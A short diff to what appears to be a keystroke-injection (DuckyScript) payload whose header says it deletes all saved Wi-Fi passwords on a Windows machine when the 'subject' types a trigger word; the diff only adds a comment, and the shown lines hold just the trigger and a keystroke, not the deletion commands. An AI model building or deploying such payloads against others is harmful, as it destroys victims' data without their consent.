@@ -1,4 +1,5 @@
 ## Deletes all wifi passwords when the subject types "nasty"
+## For Windows Powershell
 
 MATCH nasty
 QUACK GUI;
